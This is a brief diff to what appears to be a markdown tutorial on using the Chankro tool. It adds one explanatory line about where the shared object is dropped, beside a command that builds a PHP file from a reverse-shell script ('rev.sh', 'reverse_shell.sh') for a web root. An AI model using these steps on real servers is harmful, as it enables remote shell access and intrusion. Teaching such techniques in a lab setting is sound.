@@ -457,6 +457,7 @@ The syntax is pretty straightforward:
 ```
 $ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
 ```
+Note: path is the absolute path where our .so will be dropped.
 
 `vim ./reverse_shell.sh`:
 ```bash
